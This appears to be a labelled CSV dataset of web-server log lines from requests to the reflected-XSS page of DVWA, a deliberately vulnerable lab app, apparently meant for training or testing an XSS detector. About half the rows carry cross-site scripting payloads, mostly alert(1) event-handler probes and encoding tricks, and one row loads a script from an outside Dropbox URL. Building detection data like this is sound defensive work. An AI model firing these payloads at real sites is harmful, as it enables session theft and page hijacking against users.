,url,malicious
9339,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe src=\""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\""></iframe>"" 400 0 ""-"" ""-""",1
10449,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<details draggable=\""true\"""" 400 0 ""-"" ""-""",1
8028,"127.0.0.1 - - [03/May/2021:03:07:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=mets HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3501,"127.0.0.1 - - [03/May/2021:03:20:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lesia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8073,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time oncontextmenu=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
13186,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dir draggable=\""true\"""" 400 0 ""-"" ""-""",1
18478,"127.0.0.1 - - [03/May/2021:03:07:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=nagel HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7074,"127.0.0.1 - - [03/May/2021:03:15:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Errol HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
457,"127.0.0.1 - - [03/May/2021:03:23:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nonna HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10819,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<listing oncontextmenu=\""alert(1)\"">test</listing>"" 400 0 ""-"" ""-""",1
13466,"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<center onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
7711,"127.0.0.1 - - [03/May/2021:03:24:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Pet HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17667,"127.0.0.1 - - [03/May/2021:03:27:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Van HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2297,"127.0.0.1 - - [03/May/2021:03:13:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Crissy HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12659,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<optgroup onclick=\""alert(1)\"">test</optgroup>"" 400 0 ""-"" ""-""",1
3578,"127.0.0.1 - - [03/May/2021:03:41:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<xmp onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
3078,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js'"" 400 0 ""-"" ""-""",1
18801,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<data onmousedown=\""alert(1)\"">test</data>"" 400 0 ""-"" ""-""",1
792,"127.0.0.1 - - [03/May/2021:03:22:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Misti HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11939,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<spacer onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
1388,"127.0.0.1 - - [03/May/2021:03:14:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Doretta HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14434,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",1
850,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
7119,"127.0.0.1 - - [03/May/2021:03:25:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rosemaria HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14502,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script\\x0D>javascript:alert(1)</script> HTTP/1.1"" 200 1713 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
4068,"127.0.0.1 - - [03/May/2021:03:16:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Freda HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3720,"127.0.0.1 - - [03/May/2021:03:27:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ursola HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16231,"127.0.0.1 - - [03/May/2021:03:40:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bdo onmouseleave=\""alert(1)\"">test</bdo>"" 400 0 ""-"" ""-""",1
13593,"127.0.0.1 - - [03/May/2021:03:27:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tung HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
539,"127.0.0.1 - - [03/May/2021:03:23:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Parveen HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7530,"127.0.0.1 - - [03/May/2021:03:19:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kellen HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17244,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;BODY BACKGROUND=\\\""javascript&#058;alert('XSS')\\\""&gt;"" 400 0 ""-"" ""-""",1
5482,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Natty HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9860,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<blockquote oncontextmenu=\""alert(1)\"">test</blockquote>"" 400 0 ""-"" ""-""",1
30,"127.0.0.1 - - [03/May/2021:03:10:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Anabel HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10220,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Odele HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16257,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a/href=\""javascript:&#13; javascript:prompt(1)\""><input"" 400 0 ""-"" ""-""",1
18896,"127.0.0.1 - - [03/May/2021:03:21:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Malina HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7052,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><template"" 400 0 ""-"" ""-""",1
7247,"127.0.0.1 - - [03/May/2021:03:41:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><html"" 400 0 ""-"" ""-""",1
16885,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><meter"" 400 0 ""-"" ""-""",1
15490,"127.0.0.1 - - [03/May/2021:03:10:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Anni HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1500,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe style=\""position:absolute;top:0;left:0;width:100%;height:100%\"""" 400 0 ""-"" ""-""",1
3310,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nathalia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8963,"127.0.0.1 - - [03/May/2021:03:12:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Building HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8988,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figure draggable=\""true\"""" 400 0 ""-"" ""-""",1
8519,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a target=\""x\"""" 400 0 ""-"" ""-""",1
3387,"127.0.0.1 - - [03/May/2021:03:28:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Xuan-Lien HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3674,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe/onreadystatechange=alert(1) HTTP/1.1"" 200 1718 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
15961,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=%(jscript)s?<B>"" 400 0 ""-"" ""-""",1
15823,"127.0.0.1 - - [03/May/2021:03:17:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hoog HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
798,"127.0.0.1 - - [03/May/2021:03:17:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gwynith HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14580,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<param onmousemove=\""alert(1)\"">test</param>"" 400 0 ""-"" ""-""",1
6532,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=*{color:gre/**/en !/**/important}"" 400 0 ""-"" ""-""",1
775,"127.0.0.1 - - [03/May/2021:03:16:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Giles HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9115,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=\""120\""><script>function"" 400 0 ""-"" ""-""",1
6127,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<span onmouseenter=\""alert(1)\"">test</span>"" 400 0 ""-"" ""-""",1
1315,"127.0.0.1 - - [03/May/2021:03:40:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dt onmousemove=\""alert(1)\"">test</dt>"" 400 0 ""-"" ""-""",1
5078,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<spacer onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
12361,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x1Ejavascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
453,"127.0.0.1 - - [03/May/2021:03:27:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tsuyoshi HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4120,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=g'\""></IFRAME>Hover the"" 400 0 ""-"" ""-""",1
8356,"127.0.0.1 - - [03/May/2021:03:17:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Henrie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15715,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<link href=validstyles.css"" 400 0 ""-"" ""-""",1
2922,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",1
7607,"127.0.0.1 - - [03/May/2021:03:20:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ktusn HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2426,"127.0.0.1 - - [03/May/2021:03:19:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Karilynn HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15430,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<keygen id=x"" 400 0 ""-"" ""-""",1
17421,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<nextid oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
605,"127.0.0.1 - - [03/May/2021:03:24:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Petr HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3449,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menu oncontextmenu=\""alert(1)\"">test</menu>"" 400 0 ""-"" ""-""",1
3907,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
17758,"127.0.0.1 - - [03/May/2021:03:11:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Arno HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17008,"127.0.0.1 - - [03/May/2021:03:25:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Romola HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16917,"127.0.0.1 - - [03/May/2021:03:19:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kamilah HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1393,"127.0.0.1 - - [03/May/2021:03:06:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=logger HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11341,"127.0.0.1 - - [03/May/2021:03:13:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cynethia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3808,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Redirect 302"" 400 0 ""-"" ""-""",1
285,"127.0.0.1 - - [03/May/2021:02:35:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<;IMG SRC=\"";jav&;#x09;ascript:alert(';XSS';);\"";>;"" 400 0 ""-"" ""-""",1
9173,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dir oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
10582,"127.0.0.1 - - [03/May/2021:03:13:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Christan HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16094,"127.0.0.1 - - [03/May/2021:03:12:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bonny HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11701,"127.0.0.1 - - [03/May/2021:02:30:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%20onloadstart%3dalert(1)%3e HTTP/1.1"" 200 1679 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
3766,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<picture id=x"" 400 0 ""-"" ""-""",1
10729,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;IMG SRC=\\\"""" 400 0 ""-"" ""-""",1
10096,"127.0.0.1 - - [03/May/2021:03:17:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ifti HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12131,"127.0.0.1 - - [03/May/2021:03:19:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kirk HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12359,"127.0.0.1 - - [03/May/2021:03:23:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ophelie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10989,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menu onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
9177,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sup onmousedown=\""alert(1)\"">test</sup>"" 400 0 ""-"" ""-""",1
4847,"127.0.0.1 - - [03/May/2021:03:17:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Heida HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6987,"127.0.0.1 - - [03/May/2021:03:40:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<hr onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
14775,"127.0.0.1 - - [03/May/2021:03:07:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=reseller HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18139,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;"" 400 0 ""-"" ""-""",1
4021,"127.0.0.1 - - [03/May/2021:03:41:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<xmp onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
9275,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='\""></title><script>alert(\""XSS by"" 400 0 ""-"" ""-""",1
14386,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<source onmouseover=\""alert(1)\"">test</source>"" 400 0 ""-"" ""-""",1
2848,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content id=x"" 400 0 ""-"" ""-""",1
16633,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmousemove=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
16853,"127.0.0.1 - - [03/May/2021:03:16:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gerber HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5607,"127.0.0.1 - - [03/May/2021:03:24:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Raoul HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15360,"127.0.0.1 - - [03/May/2021:03:22:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mercer HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15092,"127.0.0.1 - - [03/May/2021:03:06:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=friend HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8062,"127.0.0.1 - - [03/May/2021:03:18:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Joey HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7883,"127.0.0.1 - - [03/May/2021:03:27:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Viki HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7804,"127.0.0.1 - - [03/May/2021:03:16:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Genowefa HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
